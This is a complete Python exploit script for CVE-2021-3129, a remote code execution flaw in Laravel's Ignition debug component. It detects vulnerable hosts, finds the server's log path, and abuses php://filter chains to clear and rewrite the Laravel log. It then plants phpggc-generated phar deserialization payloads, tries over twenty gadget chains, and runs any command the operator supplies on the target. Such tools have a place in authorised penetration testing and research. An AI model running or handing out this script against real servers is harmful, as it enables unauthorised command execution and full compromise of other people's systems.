#!/usr/bin/env python3
import requests
import argparse
import urllib3
import pathlib
import subprocess
import re
import base64

# Disables a pyright warning, because its annoying
# pyright: reportOptionalMemberAccess=false 
# Disables the InsecureRequestWarning because we set verify to False because of proxies
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Global variable for the args
args = None

def parse_args() -> argparse.Namespace:
    """
    Returns the parsed arguments passed in via argparse
    Required arguments are marked by a star (*)

    Returns: 
        argparse.Namespace: the parsed args
    """

    # Add some default checks 
    parser = argparse.ArgumentParser(description="CVE-2021-3129 exploit script by cc3305")
    parser.add_argument("URL", action="store", help="Target url")
    parser.add_argument("-f", "--force", action="store_true", help="Force the exploit (skip the check if the host is vulnerable)")
    parser.add_argument("-x", "--proxy", action="store", help="HTTP proxy in the format http://127.0.0.1:8080")
    parser.add_argument("-H", "--headers", action="append", help="Request Headers in the format `\"Header-Name: Header-Value\"`. Multiple -H flags are allowed")
    parser.add_argument("-c", "--cookie", action="append", help="Cookie data in the format `\"COOKIE1=VALUE1; COOKIE2=VALUE2\"`")
    parser.add_argument("-l", "--log-path", action="store", help="The path to the laravel log path. If not set, will be parsed automatically")
    parser.add_argument("-g", "--gadget-chain", action="store", help="The gadget chain to use. If not set, all available gadget chains will be tested")
    # Add more checks according to exploit, e.g. add a "--command" for a RCE exploit
    parser.add_argument("-C", "--command", action="store", help="* Command to run on the target if exploited successfully", required=True)
    
    # Return the parsed args
    result = parser.parse_args()

    # Bring the proxy, cookies and headers into a pythonic format
    result.proxy = {"http": result.proxy, "https": result.proxy}

    headers = {}
    if(result.headers != None):
        for header in result.headers:
            try:
                header_parts = header.split("=")
                headers[header_parts[0]] = header_parts[1]
            except:
                continue
    result.headers = headers

    cookies = {}
    if(result.cookie != None):
        for cookie in result.cookie.split(";"):
            try:
                cookie_parts = cookie.split("=")
                cookies[cookie_parts[0]] = cookie_parts[1]
            except:
                continue
    result.cookie = cookies

    # The program always assumes the url is in the format http://something.com/, not in http://something.com
    if not result.URL.endswith("/"):
        result.URL = f"{result.URL}/"

    return result

def check_vulnerable() -> bool:
    """
    Check if the target is vulnerable
    If there is no way to determine if the host is vulnerable just return true
    Returns: 
        bool: True if the host is vulernable, false otherwise
    """
    # Post to /_ignition/execute-solution -> if 405, host is vulnerable, otherwise not
    req = requests.get(url=f"{args.URL}_ignition/execute-solution", proxies=args.proxy, verify=False, headers=args.headers, cookies=args.cookie)
    
    return req.status_code == 405

def make_post(viewFile: str) -> requests.Response:
    """
    Make a post request to the right endpoint with the correct data and headers
    Arguments:
        viewFile(str): The viewfile to send
    Returns:
        Response: The response from the server
    """
    data = {
        "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
        "parameters": {
            "variableName": "cc3305",
            "viewFile": viewFile
        }
    }

    additional_headers = {
        "Content-Type": "application/json",
        "Accept": "application/json"
    }

    # use this instead of | because | is only python version >= 3.9
    headers = {**additional_headers, **args.headers}
    request = requests.post(url=f"{args.URL}_ignition/execute-solution", json=data, headers=headers, proxies=args.proxy, verify=False, cookies=args.cookie)

    return request


def cause_error_in_logs() -> bool:
    """
    Cause a error in the laravel logs
    Returns:
        bool: True if the error was caused successfully
    """
    return make_post("AA").status_code == 500

def clear_laravel_logs() -> bool:
    """
    Clears the laravel logs on the server
    Returns:
        bool: True if the logs were successfully cleared
    """
    resp = make_post(f"php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource={args.log_path}")
    return resp.status_code == 200


def run_exploit():
    """
    Where most of the magic happens
    """
    # Generate a payload and execute the command
    payload = generate_payloads([args.gadget_chain], args.command)
    execute_payload(args.gadget_chain, payload[args.gadget_chain])


def generate_payloads(chains: list[str], command: str, padding: int = 16) -> dict:
    """
    Generate payloads from chains
    Arguments:
        chains(list[str]): list of phpggc gadget chains
        command(str): The command to execute
        padding(int): Padding for the playload. Defaults to 16
    Returns:
        dict: A dict with the generate playloads, where the key is the chain name and the value is the payload
    """
    generated_payloads = {}
    # Create a temp folder to save all the chains
    temp_dir = pathlib.Path("./phar_tmp")
    if not temp_dir.exists():
        temp_dir.mkdir()

    # Generate all the payloads from the chains via phpggc
    for chain in chains:
        phar_name = chain.replace("/", "-") + ".phar"
        phar_path = temp_dir / phar_name
        sys_command = [
            "php",
            "-dphar.readonly=0",
            "./phpggc/phpggc",
            chain,
            "system",
            command,
            "--phar",
            "phar",
            "-o",
            str(phar_path)
        ]
        subprocess.call(sys_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if not phar_path.exists():
            print(f"Could not create exploit for chain {chain}")
            continue
        # Read the payload and convert it
        payload = open(phar_path, 'rb').read()
        payload = base64.b64encode(payload).decode().rstrip("=")
        payload = "A" * padding + "".join([i + "=00" for i in payload]) + "A"

        generated_payloads[chain] = payload

        # Delete temporary files
        phar_path.unlink()

    # Delete the temp folder
    temp_dir.rmdir()

    return generated_payloads

def find_working_chains() -> list[str]:
    """
    Find a working gadget chain
    Returns:
        list[str]: a list of working gadget chains
    """
    possible_chains = [
        "laravel/rce1", "laravel/rce2", "laravel/rce3", "laravel/rce4", 
        "laravel/rce7", "laravel/rce8", "laravel/rce9", "laravel/rce10", 
        "laravel/rce11", "laravel/rce12", "laravel/rce13", "laravel/rce14", 
        "laravel/rce15", "laravel/rce16", "monolog/rce1", "monolog/rce2", 
        "monolog/rce3", "monolog/rce5", "monolog/rce6", "monolog/rce7", 
        "monolog/rce8", "monolog/rce9"
    ]
    working_chains = []
    payloads = generate_payloads(possible_chains, "whoami")
    for chain, payload in payloads.items():
        print(f"========Testing '{chain}'========")
        res = execute_payload(chain, payload)
        if res:
            working_chains.append(chain)
    return working_chains
            

def execute_payload(chain: str, payload: str) -> bool:
    """
    Executes a payload
    Arguments:
        chain(str): The chain to use 
        payload(str): The payload to use
    Returns:
        bool: True if the payload executed successfully
    """
    # Clear logs so old payloads dont execute
    print(f"1. Clearing logs")
    if not clear_laravel_logs():
        print(f"Chain {chain} failed (Could not clear logs)")
        return False
    # Cause error in logs
    print(f"2. Causing error")
    if not cause_error_in_logs():
        print(f"Chain {chain} failed (Could not cause error)")
        clear_laravel_logs()
        return False
    print(f"3. Writing payload")
    # Write payload to log file
    if make_post(payload).status_code != 500:
        print(f"Chain {chain} failed (Could not write payload to log files)")
        clear_laravel_logs()
        return False
    # Decode the base64 payload 
    print(f"4. Decoding payload")
    convert_resp = make_post(f"php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource={args.log_path}")
    if convert_resp.status_code != 200:
        print(f"Chain {chain} failed (Could not convert payload)")
        clear_laravel_logs()
        return False
    print("5. Executing payload")
    # Execute the phar payload
    exploit_resp = make_post(f"phar://{args.log_path}")
    clear_laravel_logs()
    if exploit_resp.status_code == 500 and "cannot be empty" in exploit_resp.text:
        result = exploit_resp.text
        result_string = result[result.index("]") + 3:].strip()
        if result_string == "\n":
            print(f"No output! (This can happen, but it doesn't mean the exploit didnt work)")
        else:
            print(f"Result: {result_string}")
        return True
    print(f"Chain {chain} failed (Could not execute payload)")
    return False

def check_phpggc():
    """
    Checks if phpggc is in the correct spot
    Returns: 
        bool: True if phpggc is present, false otherwise
    """
    phpgcc_filepath = pathlib.Path("./phpggc/phpggc")
    return phpgcc_filepath.exists()

def check_php():
    """
    Checks if php is installed
    Returns: 
        bool: True if php installed, false otherwise
    """
    try:
        subprocess.check_call(['php', '-v'], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        return True
    except:
        return False

def parse_log_path():
    """
    Finds the log path via a request and sets it in the args.
    Returns: 
        bool: True if the path was found, false otherwise
    """
    print(f"Parsing log path")
    # We can get the logpath by casuign a error, observing which path the server uses (linux or windows) and guessing from there
    req = requests.get(url=f"{args.URL}_ignition/execute-solution", proxies=args.proxy, verify=False, headers=args.headers, cookies=args.cookie)
    search_pattern = r"The GET method is not supported for this route\. Supported methods: POST\. in file (.*?) on line"
    search = re.search(search_pattern, req.text)
    if not search:
        return False

    filepath = search.groups()[0]

    # Linux path seperator
    seperator = "/"
    split_by_seperator = "/"

    if r"\\vendor\\laravel\\framework" in filepath:
        # Windows
        seperator = "\\"
        split_by_seperator = "\\\\"
    rootpath = filepath.split(rf"{split_by_seperator}vendor{split_by_seperator}laravel{split_by_seperator}framework")[0].replace(split_by_seperator, seperator)
    args.log_path = f"{rootpath}{seperator}storage{seperator}logs{seperator}laravel.log"
    return True

def main():
    global args
    args = parse_args()

    if not check_php():
        print(f"php not found")
        exit(0)
    if not check_phpggc():
        print(f"phpggc not found, check the README for installation")
        exit(0)

    if not args.force:
        if not check_vulnerable():
            print(f"Host seems to not be vulnerable, use --force to override")
            exit(0)

    if args.log_path == None:
        if not parse_log_path():
            print(f"Could not find log path automatically, specify it with --log-path")
            exit(0)

    if args.gadget_chain == None:
        print(f"No gadget chain provided, checking all of them")
        chains = find_working_chains()
        if len(chains) < 1:
            print(f"No working chains found, something is wrong")
            exit(0)
        print(f"Found {len(chains)} chains: {chains}, using {chains[0]}")
        args.gadget_chain = chains[0]

    run_exploit()

# Entrypoint, this gets executed first
if __name__ == "__main__":
    main()
